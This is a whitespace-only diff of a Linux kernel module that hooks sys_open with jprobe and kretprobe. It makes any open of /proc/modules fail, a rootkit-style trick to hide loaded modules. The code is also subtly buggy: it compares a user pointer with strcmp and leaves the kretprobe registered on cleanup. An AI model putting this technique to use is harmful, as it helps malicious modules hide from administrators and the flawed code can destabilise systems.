@@ -22,49 +22,51 @@ static char hidden;
 
 asmlinkage long new_sys_open(const char __user *filename, int flags, umode_t mode)
 {
-  if (strcmp(filename, "/proc/modules") == 0)
-    hidden = 1;
-  else
-    hidden = 0;
-  jprobe_return();
-  return 0;
+	  if (strcmp(filename, "/proc/modules") == 0)
+	    hidden = 1;
+	  else
+	    hidden = 0;
+	  
+	  jprobe_return();
+  
+	  return 0;
 }
 
 static int open_ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
-  if (hidden)
-    {
-      regs->ax = -1;
-    }
-  return 0;
+	if (hidden)
+	  regs->ax = -1;
+
+	return 0;
 }
       
-static struct jprobe my_jprobe = {
-  .entry= new_sys_open,
-  .kp = {
-    .symbol_name = "sys_open",
-  },
-};
+static struct jprobe my_jprobe =
+	{
+	  .entry= new_sys_open,
+	  .kp = {
+	    .symbol_name = "sys_open",
+	  },
+	};
 
 static struct kretprobe mprotect_kretprobe =
-  {
-    .handler = open_ret_handler,
-    .maxactive = 100
-  };
+	  {
+	    .handler = open_ret_handler,
+	    .maxactive = 100
+	  };
 
 
 int init_module(void)
 {
-  int ret = 0;
+	  int ret = 0;
 
-  hidden = 0;
-  ret = register_jprobe(&my_jprobe);  
-  mprotect_kretprobe.kp.addr = (kprobe_opcode_t *)kallsyms_lookup_name("sys_open");
-  register_kretprobe(&mprotect_kretprobe);
-  return ret;
+	  hidden = 0;
+	  ret = register_jprobe(&my_jprobe);  
+	  mprotect_kretprobe.kp.addr = (kprobe_opcode_t *)kallsyms_lookup_name("sys_open");
+	  register_kretprobe(&mprotect_kretprobe);
+	  return ret;
 }
 
 void cleanup_module(void)
 {
-  unregister_jprobe(&my_jprobe);
+	  unregister_jprobe(&my_jprobe);
 }
